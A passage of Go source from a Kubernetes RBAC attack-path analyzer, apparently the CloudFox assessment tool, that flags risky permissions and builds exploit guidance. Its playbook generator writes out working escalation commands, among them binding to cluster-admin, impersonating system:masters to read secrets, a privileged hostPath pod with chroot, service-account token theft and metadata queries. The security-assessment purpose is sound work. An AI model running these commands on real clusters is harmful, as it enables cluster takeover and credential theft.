		}
	}

	// Cache the computed result
	sdk.Set(cacheKey, result)

	return result, nil
}

// AnalyzeClusterAttackPaths analyzes ClusterRoleBindings for attack paths
func (s *AttackPathService) AnalyzeClusterAttackPaths(ctx context.Context, pathType string) ([]AttackPath, error) {
	var paths []AttackPath

	// Get ClusterRoleBindings (cached)
	crbsList, err := sdk.GetClusterRoleBindings(ctx, s.clientset)
	if err != nil {
		return nil, fmt.Errorf("failed to list ClusterRoleBindings: %w", err)
	}

	// Get ClusterRoles (cached)
	clusterRolesList, err := sdk.GetClusterRoles(ctx, s.clientset)
	if err != nil {
		return nil, fmt.Errorf("failed to list ClusterRoles: %w", err)
	}

	// Build ClusterRole map
	crMap := make(map[string]*v1.ClusterRole)
	for i := range clusterRolesList {
		crMap[clusterRolesList[i].Name] = &clusterRolesList[i]
	}

	// Analyze each ClusterRoleBinding
	for _, crb := range crbsList {
		cr, ok := crMap[crb.RoleRef.Name]
		if !ok {
			continue
		}

		for _, subject := range crb.Subjects {
			subjectPaths := s.analyzeRulesForAttackPaths(
				subject,
				cr.Rules,
				crb.RoleRef.Name,
				crb.Name,
				"cluster",
				"cluster",
				"cluster-wide",
				pathType,
			)
			paths = append(paths, subjectPaths...)
		}
	}

	return paths, nil
}

// AnalyzeNamespaceAttackPaths analyzes RoleBindings in a namespace for attack paths
func (s *AttackPathService) AnalyzeNamespaceAttackPaths(ctx context.Context, namespace string, pathType string) ([]AttackPath, error) {
	var paths []AttackPath

	// Get RoleBindings (cached) and filter by namespace
	allRbs, err := sdk.GetRoleBindings(ctx, s.clientset)
	if err != nil {
		return nil, fmt.Errorf("failed to list RoleBindings in %s: %w", namespace, err)
	}
	var rbs []v1.RoleBinding
	for _, rb := range allRbs {
		if rb.Namespace == namespace {
			rbs = append(rbs, rb)
		}
	}

	// Get Roles (cached) and filter by namespace
	allRoles, err := sdk.GetRoles(ctx, s.clientset)
	if err != nil {
		return nil, fmt.Errorf("failed to list Roles in %s: %w", namespace, err)
	}
	var roles []v1.Role
	for _, role := range allRoles {
		if role.Namespace == namespace {
			roles = append(roles, role)
		}
	}

	// Get ClusterRoles (RoleBindings can reference ClusterRoles) (cached)
	clusterRoles, err := sdk.GetClusterRoles(ctx, s.clientset)
	if err != nil {
		return nil, fmt.Errorf("failed to list ClusterRoles: %w", err)
	}

	// Build Role maps
	roleMap := make(map[string]*v1.Role)
	for i := range roles {
		roleMap[roles[i].Name] = &roles[i]
	}
	crMap := make(map[string]*v1.ClusterRole)
	for i := range clusterRoles {
		crMap[clusterRoles[i].Name] = &clusterRoles[i]
	}

	// Analyze each RoleBinding
	for _, rb := range rbs {
		var rules []v1.PolicyRule

		if rb.RoleRef.Kind == "Role" {
			if role, ok := roleMap[rb.RoleRef.Name]; ok {
				rules = role.Rules
			}
		} else if rb.RoleRef.Kind == "ClusterRole" {
			if cr, ok := crMap[rb.RoleRef.Name]; ok {
				rules = cr.Rules
			}
		}

		if len(rules) == 0 {
			continue
		}

		for _, subject := range rb.Subjects {
			subjectPaths := s.analyzeRulesForAttackPaths(
				subject,
				rules,
				rb.RoleRef.Name,
				rb.Name,
				"namespace",
				namespace,
				namespace,
				pathType,
			)
			paths = append(paths, subjectPaths...)
		}
	}

	return paths, nil
}

// verbMatchesRule returns true if the rule verb covers the permission verb.
// Handles: exact match and "*" wildcard.
func verbMatchesRule(ruleVerb, permVerb string) bool {
	return ruleVerb == "*" || ruleVerb == permVerb
}

// resourceMatchesRule returns true if the rule resource covers the permission resource.
// Handles: exact match, "*" wildcard, and parent resource covering subresources
// (e.g., rule "nodes" does NOT cover "nodes/proxy" in K8s RBAC — subresources are distinct).
func resourceMatchesRule(ruleResource, permResource string) bool {
	return ruleResource == "*" || ruleResource == permResource
}

// apiGroupMatchesRule returns true if the rule API group covers the permission API group.
func apiGroupMatchesRule(ruleGroup, permGroup string) bool {
	return ruleGroup == "*" || ruleGroup == permGroup
}

// MatchedPermission holds a matched permission with its resolved verb/resource for exploit generation
type MatchedPermission struct {
	Category        string
	RiskLevel       string
	Description     string
	MatchedVerb     string // The actual verb from the permission definition (not the wildcard)
	MatchedResource string // The actual resource from the permission definition
	MatchedAPIGroup string // The API group from the permission definition
}

// crdAPIGroups contains API groups that indicate CRD-based resources
var crdAPIGroups = map[string]bool{
	"apiextensions.k8s.io":        true,
	"cert-manager.io":             true,
	"external-secrets.io":         true,
	"secrets-store.csi.x-k8s.io":  true,
	"vault.hashicorp.com":         true,
	"networking.istio.io":         true,
	"cilium.io":                   true,
	"projectcalico.org":           true,
}

func sourceTypeForAPIGroup(apiGroup string) string {
	if crdAPIGroups[apiGroup] {
		return "crd"
	}
	if apiGroup == "*" {
		return "core" // wildcards default to core
	}
	return "core"
}

// FindMatchingPrivescPermissions returns all privesc permissions that a given RBAC rule grants.
// This properly expands wildcards: e.g., verb "*" + resource "nodes/proxy" matches "get nodes/proxy".
// This function is exported for use by other modules like namespaces.go
func FindMatchingPrivescPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []MatchedPermission {
	var matches []MatchedPermission
	seen := make(map[string]bool) // deduplicate by category+resource

	for _, perm := range GetPrivescPermissions() {
		if verbMatchesRule(ruleVerb, perm.Verb) &&
			resourceMatchesRule(ruleResource, perm.Resource) &&
			apiGroupMatchesRule(ruleAPIGroup, perm.APIGroup) {

			key := perm.Category + ":" + perm.Resource + ":" + perm.Verb
			if seen[key] {
				continue
			}
			seen[key] = true

			matches = append(matches, MatchedPermission{
				Category:        perm.Category,
				RiskLevel:       perm.RiskLevel,
				Description:     perm.Description,
				MatchedVerb:     perm.Verb,
				MatchedResource: perm.Resource,
				MatchedAPIGroup: perm.APIGroup,
			})
		}
	}
	return matches
}

// FindMatchingLateralPermissions returns all lateral movement permissions that a given RBAC rule grants.
// This function is exported for use by other modules like namespaces.go
func FindMatchingLateralPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []MatchedPermission {
	var matches []MatchedPermission
	seen := make(map[string]bool)

	for _, perm := range GetLateralMovementPermissions() {
		if verbMatchesRule(ruleVerb, perm.Verb) &&
			resourceMatchesRule(ruleResource, perm.Resource) &&
			apiGroupMatchesRule(ruleAPIGroup, perm.APIGroup) {

			key := perm.Category + ":" + perm.Resource + ":" + perm.Verb
			if seen[key] {
				continue
			}
			seen[key] = true

			matches = append(matches, MatchedPermission{
				Category:        perm.Category,
				RiskLevel:       perm.RiskLevel,
				Description:     perm.Description,
				MatchedVerb:     perm.Verb,
				MatchedResource: perm.Resource,
				MatchedAPIGroup: perm.APIGroup,
			})
		}
	}
	return matches
}

// FindMatchingExfilPermissions returns all data exfil permissions that a given RBAC rule grants.
// This function is exported for use by other modules like namespaces.go
func FindMatchingExfilPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []MatchedPermission {
	var matches []MatchedPermission
	seen := make(map[string]bool)

	for _, perm := range GetDataExfilPermissions() {
		if verbMatchesRule(ruleVerb, perm.Verb) &&
			resourceMatchesRule(ruleResource, perm.Resource) &&
			apiGroupMatchesRule(ruleAPIGroup, perm.APIGroup) {

			key := perm.Category + ":" + perm.Resource + ":" + perm.Verb
			if seen[key] {
				continue
			}
			seen[key] = true

			matches = append(matches, MatchedPermission{
				Category:        perm.Category,
				RiskLevel:       perm.RiskLevel,
				Description:     perm.Description,
				MatchedVerb:     perm.Verb,
				MatchedResource: perm.Resource,
				MatchedAPIGroup: perm.APIGroup,
			})
		}
	}
	return matches
}

// FindMatchingHiddenAdminPermissions returns all hidden admin permissions that a given RBAC rule grants.
// This function is exported for use by other modules like hidden_admins.go
func FindMatchingHiddenAdminPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []MatchedPermission {
	var matches []MatchedPermission
	seen := make(map[string]bool)

	for _, perm := range GetHiddenAdminPermissions() {
		if verbMatchesRule(ruleVerb, perm.Verb) &&
			resourceMatchesRule(ruleResource, perm.Resource) &&
			apiGroupMatchesRule(ruleAPIGroup, perm.APIGroup) {

			key := perm.Category + ":" + perm.Resource + ":" + perm.Verb
			if seen[key] {
				continue
			}
			seen[key] = true

			matches = append(matches, MatchedPermission{
				Category:        perm.Category,
				RiskLevel:       perm.RiskLevel,
				Description:     perm.Description,
				MatchedVerb:     perm.Verb,
				MatchedResource: perm.Resource,
				MatchedAPIGroup: perm.APIGroup,
			})
		}
	}
	return matches
}

// =============================================================================
// Helper Functions for External Use
// These functions allow other modules (namespaces.go, hidden_admins.go) to use
// the centralized attack path detection logic without duplicating permission lists.
// =============================================================================

// HasDangerousPermissions checks if the given RBAC rules contain any dangerous permissions
// (privesc, lateral movement, or data exfil). This is the centralized replacement for
// hasDangerousPermissions() in namespaces.go.
func HasDangerousPermissions(rules []v1.PolicyRule) bool {
	for _, rule := range rules {
		for _, verb := range rule.Verbs {
			for _, resource := range rule.Resources {
				apiGroups := rule.APIGroups
				if len(apiGroups) == 0 {
					apiGroups = []string{""}
				}
				for _, apiGroup := range apiGroups {
					// Check for any type of dangerous permission
					if len(FindMatchingPrivescPermissions(verb, resource, apiGroup)) > 0 ||
						len(FindMatchingLateralPermissions(verb, resource, apiGroup)) > 0 ||
						len(FindMatchingExfilPermissions(verb, resource, apiGroup)) > 0 {
						return true
					}
				}
			}
		}
	}
	return false
}

// CheckPrivilegeEscalation checks if the rules allow privilege escalation and returns the reasons.
// This is the centralized replacement for checkPrivilegeEscalation() in namespaces.go.
func CheckPrivilegeEscalation(rules []v1.PolicyRule) (bool, []string) {
	var reasons []string
	seen := make(map[string]bool)

	for _, rule := range rules {
		for _, verb := range rule.Verbs {
			for _, resource := range rule.Resources {
				apiGroups := rule.APIGroups
				if len(apiGroups) == 0 {
					apiGroups = []string{""}
				}
				for _, apiGroup := range apiGroups {
					for _, match := range FindMatchingPrivescPermissions(verb, resource, apiGroup) {
						reason := match.Category
						if !seen[reason] {
							seen[reason] = true
							reasons = append(reasons, reason)
						}
					}
				}
			}
		}
	}

	return len(reasons) > 0, reasons
}

// GetDangerousPermissionsList returns a list of dangerous permissions in the rules.
// This is the centralized replacement for getDangerousPermissionsList() in namespaces.go.
func GetDangerousPermissionsList(rules []v1.PolicyRule) []string {
	var perms []string
	seen := make(map[string]bool)

	for _, rule := range rules {
		for _, verb := range rule.Verbs {
			for _, resource := range rule.Resources {
				apiGroups := rule.APIGroups
				if len(apiGroups) == 0 {
					apiGroups = []string{""}
				}
				for _, apiGroup := range apiGroups {
					// Check privesc permissions
					for _, match := range FindMatchingPrivescPermissions(verb, resource, apiGroup) {
						perm := fmt.Sprintf("%s/%s", match.MatchedResource, match.MatchedVerb)
						if !seen[perm] {
							seen[perm] = true
							perms = append(perms, perm)
						}
					}
					// Check lateral movement permissions
					for _, match := range FindMatchingLateralPermissions(verb, resource, apiGroup) {
						perm := fmt.Sprintf("%s/%s", match.MatchedResource, match.MatchedVerb)
						if !seen[perm] {
							seen[perm] = true
							perms = append(perms, perm)
						}
					}
					// Check exfil permissions
					for _, match := range FindMatchingExfilPermissions(verb, resource, apiGroup) {
						perm := fmt.Sprintf("%s/%s", match.MatchedResource, match.MatchedVerb)
						if !seen[perm] {
							seen[perm] = true
							perms = append(perms, perm)
						}
					}
				}
			}
		}
	}

	return perms
}

// IsHiddenAdminRule checks if a rule grants IAM/RBAC escalation permissions.
// This is the centralized replacement for isIAMRelatedRule() in hidden_admins.go.
func IsHiddenAdminRule(rule v1.PolicyRule) bool {
	for _, verb := range rule.Verbs {
		for _, resource := range rule.Resources {
			apiGroups := rule.APIGroups
			if len(apiGroups) == 0 {
				apiGroups = []string{""}
			}
			for _, apiGroup := range apiGroups {
				if len(FindMatchingHiddenAdminPermissions(verb, resource, apiGroup)) > 0 {
					return true
				}
			}
		}
	}
	return false
}

// GetHiddenAdminRiskDescription returns a human-readable description of IAM/RBAC risks from a rule.
// This is the centralized replacement for getIAMRiskDescription() in hidden_admins.go.
func GetHiddenAdminRiskDescription(rule v1.PolicyRule) string {
	var descriptions []string
	seen := make(map[string]bool)

	for _, verb := range rule.Verbs {
		for _, resource := range rule.Resources {
			apiGroups := rule.APIGroups
			if len(apiGroups) == 0 {
				apiGroups = []string{""}
			}
			for _, apiGroup := range apiGroups {
				for _, match := range FindMatchingHiddenAdminPermissions(verb, resource, apiGroup) {
					desc := match.Description
					if !seen[desc] {
						seen[desc] = true
						descriptions = append(descriptions, desc)
					}
				}
			}
		}
	}

	if len(descriptions) == 0 {
		return ""
	}
	return strings.Join(descriptions, "; ")
}

// analyzeRulesForAttackPaths analyzes RBAC rules for attack paths.
// Properly expands wildcards: a rule with verb "*" on resource "nodes/proxy"
// will match all known dangerous permissions for that resource (e.g., "get nodes/proxy" RCE).
// Similarly, a rule with resource "*" will match all known dangerous resources for that verb.
func (s *AttackPathService) analyzeRulesForAttackPaths(
	subject v1.Subject,
	rules []v1.PolicyRule,
	roleName string,
	bindingName string,
	scopeType string,
	scopeID string,
	scopeName string,
	pathType string,
) []AttackPath {
	var paths []AttackPath

	// Format principal
	principal := formatPrincipal(subject)
	principalType := subject.Kind

	for _, rule := range rules {
		for _, verb := range rule.Verbs {
			for _, resource := range rule.Resources {
				apiGroups := rule.APIGroups
				if len(apiGroups) == 0 {
					apiGroups = []string{""}
				}

				for _, apiGroup := range apiGroups {
					// Privesc analysis with wildcard expansion
					if pathType == "privesc" || pathType == "all" {
						for _, match := range FindMatchingPrivescPermissions(verb, resource, apiGroup) {
							path := AttackPath{
								Principal:      principal,
								PrincipalType:  principalType,
								Method:         match.Category,
								TargetResource: match.MatchedResource,
								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
								Category:       match.Category,
								RiskLevel:      match.RiskLevel,
								Description:    match.Description,
								ExploitCommand: generateExploitCommand("privesc", match.MatchedVerb, match.MatchedResource, scopeID, principal),
								Namespace:      subject.Namespace,
								ScopeType:      scopeType,
								ScopeID:        scopeID,
								ScopeName:      scopeName,
								PathType:       "privesc",
								SourceType:     sourceTypeForAPIGroup(match.MatchedAPIGroup),
								RoleName:       roleName,
								BindingName:    bindingName,
							}
							paths = append(paths, path)
						}
					}

					// Lateral movement analysis with wildcard expansion
					if pathType == "lateral" || pathType == "all" {
						for _, match := range FindMatchingLateralPermissions(verb, resource, apiGroup) {
							path := AttackPath{
								Principal:      principal,
								PrincipalType:  principalType,
								Method:         match.Category,
								TargetResource: match.MatchedResource,
								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
								Category:       match.Category,
								RiskLevel:      match.RiskLevel,
								Description:    match.Description,
								ExploitCommand: generateExploitCommand("lateral", match.MatchedVerb, match.MatchedResource, scopeID, principal),
								Namespace:      subject.Namespace,
								ScopeType:      scopeType,
								ScopeID:        scopeID,
								ScopeName:      scopeName,
								PathType:       "lateral",
								SourceType:     sourceTypeForAPIGroup(match.MatchedAPIGroup),
								RoleName:       roleName,
								BindingName:    bindingName,
							}
							paths = append(paths, path)
						}
					}

					// Data exfiltration analysis with wildcard expansion
					if pathType == "exfil" || pathType == "all" {
						for _, match := range FindMatchingExfilPermissions(verb, resource, apiGroup) {
							path := AttackPath{
								Principal:      principal,
								PrincipalType:  principalType,
								Method:         match.Category,
								TargetResource: match.MatchedResource,
								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
								Category:       match.Category,
								RiskLevel:      match.RiskLevel,
								Description:    match.Description,
								ExploitCommand: generateExploitCommand("exfil", match.MatchedVerb, match.MatchedResource, scopeID, principal),
								Namespace:      subject.Namespace,
								ScopeType:      scopeType,
								ScopeID:        scopeID,
								ScopeName:      scopeName,
								PathType:       "exfil",
								SourceType:     sourceTypeForAPIGroup(match.MatchedAPIGroup),
								RoleName:       roleName,
								BindingName:    bindingName,
							}
							paths = append(paths, path)
						}
					}

					// Dynamic CRD group matching: detect when RBAC grants dangerous
					// permissions on any CRD API group actually present in the cluster
					if len(s.crdGroups) > 0 {
						paths = append(paths, s.checkDynamicCRDAccess(
							verb, resource, apiGroup,
							principal, principalType, roleName, bindingName,
							scopeType, scopeID, scopeName, subject.Namespace,
							pathType,
						)...)
					}
				}
			}
		}
	}

	return paths
}

// checkDynamicCRDAccess detects when an RBAC rule grants dangerous permissions on a CRD API group
// that actually exists in the cluster. This catches cases like: a subject has create/update/delete
// on resources in "cert-manager.io" or any other CRD group — not just the hardcoded static checks.
func (s *AttackPathService) checkDynamicCRDAccess(
	verb, resource, apiGroup string,
	principal, principalType, roleName, bindingName string,
	scopeType, scopeID, scopeName, namespace string,
	pathType string,
) []AttackPath {
	var paths []AttackPath

	// Only check dangerous verbs
	dangerousVerbs := map[string]bool{
		"create": true, "update": true, "patch": true, "delete": true, "deletecollection": true, "*": true,
	}
	if !dangerousVerbs[verb] {
		return nil
	}

	// Check if the rule's API group matches any CRD group in the cluster
	matchedGroups := s.matchingCRDGroups(apiGroup)
	if len(matchedGroups) == 0 {
		return nil
	}

	// Skip if this would duplicate a static check (already covered by hardcoded permissions)
	for _, group := range matchedGroups {
		if crdAPIGroups[group] {
			continue // already handled by static permission lists
		}

		effectiveVerb := verb
		if effectiveVerb == "*" {
			effectiveVerb = "create/update/patch/delete"
		}
		effectiveResource := resource
		if effectiveResource == "*" {
			effectiveResource = "all resources"
		}

		desc := fmt.Sprintf("Can %s %s in CRD group %s", effectiveVerb, effectiveResource, group)
		exploitCmd := generateDynamicCRDExploitCommand(verb, resource, group, scopeID, principal)

		// Determine path type and category
		category := "CRD Resource Access"
		riskLevel := shared.RiskMedium
		if verb == "*" || verb == "create" {
			riskLevel = shared.RiskHigh
		}

		// For privesc: modifying CRD resources could escalate privileges
		if pathType == "privesc" || pathType == "all" {
			paths = append(paths, AttackPath{
				Principal:      principal,
				PrincipalType:  principalType,
				Method:         category,
				TargetResource: fmt.Sprintf("%s/%s", group, resource),
				Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
				Category:       category,
				RiskLevel:      riskLevel,
				Description:    desc,
				ExploitCommand: exploitCmd,
				Namespace:      namespace,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				PathType:       "privesc",
				SourceType:     "crd",
				RoleName:       roleName,
				BindingName:    bindingName,
			})
		}

		// For lateral: CRD resource access can enable lateral movement
		if pathType == "lateral" || pathType == "all" {
			paths = append(paths, AttackPath{
				Principal:      principal,
				PrincipalType:  principalType,
				Method:         category,
				TargetResource: fmt.Sprintf("%s/%s", group, resource),
				Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
				Category:       category,
				RiskLevel:      riskLevel,
				Description:    desc,
				ExploitCommand: exploitCmd,
				Namespace:      namespace,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				PathType:       "lateral",
				SourceType:     "crd",
				RoleName:       roleName,
				BindingName:    bindingName,
			})
		}

		// For exfil: reading CRD resources could expose sensitive data
		if pathType == "exfil" || pathType == "all" {
			paths = append(paths, AttackPath{
				Principal:      principal,
				PrincipalType:  principalType,
				Method:         category,
				TargetResource: fmt.Sprintf("%s/%s", group, resource),
				Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
				Category:       category,
				RiskLevel:      riskLevel,
				Description:    desc,
				ExploitCommand: exploitCmd,
				Namespace:      namespace,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				PathType:       "exfil",
				SourceType:     "crd",
				RoleName:       roleName,
				BindingName:    bindingName,
			})
		}
	}

	return paths
}

// matchingCRDGroups returns CRD groups that match the given API group (supports wildcards)
func (s *AttackPathService) matchingCRDGroups(apiGroup string) []string {
	if apiGroup == "*" {
		// Wildcard matches all CRD groups
		groups := make([]string, 0, len(s.crdGroups))
		for g := range s.crdGroups {
			groups = append(groups, g)
		}
		return groups
	}
	if s.crdGroups[apiGroup] {
		return []string{apiGroup}
	}
	return nil
}

// Helper functions

func formatPrincipal(subject v1.Subject) string {
	switch subject.Kind {
	case "ServiceAccount":
		if subject.Namespace != "" {
			return fmt.Sprintf("%s:%s", subject.Namespace, subject.Name)
		}
		return subject.Name
	case "User", "Group":
		return subject.Name
	default:
		return subject.Name
	}
}

// generateDynamicCRDExploitCommand creates detailed exploitation commands for dynamically
// discovered CRD API groups. Since these are not hardcoded, the commands guide the operator
// through enumeration and exploitation of the specific CRD group.
func generateDynamicCRDExploitCommand(verb, resource, group, scope, principal string) string {
	nsFlag := ""
	if scope != "cluster" {
		nsFlag = fmt.Sprintf("-n %s ", scope)
	}

	res := resource
	if res == "*" {
		res = "<resource>"
	}

	lines := []string{
		fmt.Sprintf("# CRD Group: %s", group),
		fmt.Sprintf("# Permission: %s on %s", verb, resource),
		"",
		"# Step 1: Discover CRDs in this API group",
		fmt.Sprintf("kubectl get crds -o name | xargs -I{} kubectl get {} -o jsonpath='{.spec.group}' | grep -l %s", group),
		fmt.Sprintf("kubectl api-resources --api-group=%s", group),
		"",
		"# Step 2: List existing custom resources",
		fmt.Sprintf("kubectl get %s%s -A --as=%s 2>/dev/null", nsFlag, res, principal),
	}

	switch verb {
	case "*":
		lines = append(lines, "",
			"# Step 3: Full access — enumerate, read, modify, and create resources",
			fmt.Sprintf("kubectl get %s%s -A -o yaml --as=%s", nsFlag, res, principal),
			"",
			"# Step 4: Create a new resource (modify spec as needed)",
			fmt.Sprintf("kubectl get %s%s -o yaml --as=%s | head -50  # copy and modify an existing resource", nsFlag, res, principal),
			fmt.Sprintf("# kubectl apply %s-f crafted-resource.yaml --as=%s", nsFlag, principal),
			"",
			"# Step 5: Check for sensitive data in resource specs",
			fmt.Sprintf("kubectl get %s%s -A -o yaml --as=%s | grep -iE 'password|secret|token|key|cert|credential'", nsFlag, res, principal),
		)
	case "create":
		lines = append(lines, "",
			"# Step 3: Get an existing resource as a template",
			fmt.Sprintf("kubectl get %s%s -o yaml 2>/dev/null | head -50", nsFlag, res),
			"",
			"# Step 4: Create a crafted resource (modify spec for exploitation)",
			fmt.Sprintf("# kubectl apply %s-f crafted-resource.yaml --as=%s", nsFlag, principal),
		)
	case "update", "patch":
		lines = append(lines, "",
			"# Step 3: Read existing resources to identify modification targets",
			fmt.Sprintf("kubectl get %s%s -A -o yaml 2>/dev/null", nsFlag, res),
			"",
			fmt.Sprintf("# Step 4: Modify a resource (%s)", verb),
			fmt.Sprintf("# kubectl %s %s%s <name> --as=%s --type=merge -p '{\"spec\":{...}}'", verb, nsFlag, res, principal),
		)
	case "delete", "deletecollection":
		lines = append(lines, "",
			"# Step 3: Identify resources to delete (e.g., security policies, network rules)",
			fmt.Sprintf("kubectl get %s%s -A --as=%s", nsFlag, res, principal),
			"",
			"# Step 4: Delete a target resource to weaken security controls",
			fmt.Sprintf("# kubectl delete %s%s <name> --as=%s", nsFlag, res, principal),
		)
	}

	return strings.Join(lines, "\n")
}

// GeneratePrivescPlaybook generates a comprehensive privilege escalation playbook from attack paths
func GeneratePrivescPlaybook(paths []AttackPath, identityHeader string) string {
	if len(paths) == 0 {
		return ""
	}

	var sections strings.Builder
	if identityHeader != "" {
		sections.WriteString(fmt.Sprintf(`# Kubernetes Privilege Escalation Playbook for %s
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified privilege escalation paths.

`, identityHeader))
	} else {
		sections.WriteString(`# Kubernetes Privilege Escalation Playbook
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified privilege escalation paths.

`)
	}

	// Group paths by category
	categories := map[string][]AttackPath{
		"Cluster Admin":         {},
		"RBAC Escalation":       {},
		"Impersonation":         {},
		"Pod Creation":          {},
		"Pod Exec":              {},
		"Workload Creation":     {},
		"Pod Modification":      {},
		"Workload Modification": {},
		"Token Creation":        {},
		"Node Access":           {},
		"Webhook":               {},
		"Certificate":           {},
		"Storage":               {},
		"CRD Management":        {},
		"CRD Resource Access":   {},
	}

	for _, path := range paths {
		if path.PathType != "privesc" {
			continue
		}
		if _, ok := categories[path.Category]; ok {
			categories[path.Category] = append(categories[path.Category], path)
		}
	}

	// Cluster Admin
	if len(categories["Cluster Admin"]) > 0 {
		sections.WriteString("## Cluster Admin\n\n")
		sections.WriteString("Principals with cluster-admin equivalent access have full control over the cluster.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Cluster Admin"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Full cluster access - can do anything\n")
		sections.WriteString("kubectl get secrets -A\n")
		sections.WriteString("kubectl get pods -A\n")
		sections.WriteString("kubectl exec -it <pod> -- /bin/sh\n")
		sections.WriteString("```\n\n")
	}

	// RBAC Escalation
	if len(categories["RBAC Escalation"]) > 0 {
		sections.WriteString("## RBAC Escalation\n\n")
		sections.WriteString("Principals with RBAC modification capabilities can escalate their privileges.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["RBAC Escalation"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create ClusterRoleBinding to cluster-admin\n")
		sections.WriteString("kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<your-user>\n\n")
		sections.WriteString("# Or create RoleBinding to admin in specific namespace\n")
		sections.WriteString("kubectl -n <namespace> create rolebinding pwn --clusterrole=admin --user=<your-user>\n\n")
		sections.WriteString("# Patch existing role to add wildcard permissions\n")
		sections.WriteString("kubectl patch clusterrole <role-name> --type=json -p='[{\"op\":\"add\",\"path\":\"/rules/-\",\"value\":{\"apiGroups\":[\"*\"],\"resources\":[\"*\"],\"verbs\":[\"*\"]}}]'\n")
		sections.WriteString("```\n\n")
	}

	// Impersonation
	if len(categories["Impersonation"]) > 0 {
		sections.WriteString("## Impersonation\n\n")
		sections.WriteString("Principals with impersonation capabilities can act as other users, groups, or service accounts.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Impersonation"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Impersonate cluster-admin user\n")
		sections.WriteString("kubectl --as=system:admin get secrets -A\n\n")
		sections.WriteString("# Impersonate system:masters group\n")
		sections.WriteString("kubectl --as=dummy --as-group=system:masters get secrets -A\n\n")
		sections.WriteString("# Impersonate a service account\n")
		sections.WriteString("kubectl --as=system:serviceaccount:kube-system:default get secrets -A\n")
		sections.WriteString("```\n\n")
	}

	// Pod Creation
	if len(categories["Pod Creation"]) > 0 {
		sections.WriteString("## Pod Creation\n\n")
		sections.WriteString("Principals with pod creation capabilities can create privileged pods for container escape.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Pod Creation"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create a privileged pod with host access\n")
		sections.WriteString("kubectl run privesc --image=alpine --restart=Never --overrides='{\n")
		sections.WriteString("  \"spec\":{\n")
		sections.WriteString("    \"hostNetwork\":true,\"hostPID\":true,\"hostIPC\":true,\n")
		sections.WriteString("    \"containers\":[{\n")
		sections.WriteString("      \"name\":\"privesc\",\"image\":\"alpine\",\n")
		sections.WriteString("      \"command\":[\"sh\",\"-c\",\"sleep 3600\"],\n")
		sections.WriteString("      \"securityContext\":{\"privileged\":true},\n")
		sections.WriteString("      \"volumeMounts\":[{\"name\":\"host\",\"mountPath\":\"/host\"}]\n")
		sections.WriteString("    }],\n")
		sections.WriteString("    \"volumes\":[{\"name\":\"host\",\"hostPath\":{\"path\":\"/\"}}]\n")
		sections.WriteString("  }\n")
		sections.WriteString("}' -- sleep 3600\n\n")
		sections.WriteString("# Access the host filesystem\n")
		sections.WriteString("kubectl exec -it privesc -- chroot /host /bin/bash\n")
		sections.WriteString("```\n\n")
	}

	// Pod Exec
	if len(categories["Pod Exec"]) > 0 {
		sections.WriteString("## Pod Exec\n\n")
		sections.WriteString("Principals with pod exec capabilities can execute commands in running containers.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Pod Exec"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Exec into a pod to steal SA token or access sensitive data\n")
		sections.WriteString("kubectl exec -it <pod-name> -- /bin/sh\n\n")
		sections.WriteString("# Read the service account token\n")
		sections.WriteString("kubectl exec <pod-name> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n")
		sections.WriteString("# Look for cloud provider metadata\n")
		sections.WriteString("kubectl exec <pod-name> -- curl -s http://169.254.169.254/latest/meta-data/\n")
		sections.WriteString("```\n\n")
	}

	// Workload Creation
	if len(categories["Workload Creation"]) > 0 {
		sections.WriteString("## Workload Creation\n\n")
		sections.WriteString("Principals with workload creation capabilities can create deployments/daemonsets with privileged SAs.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Workload Creation"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create deployment with privileged service account\n")
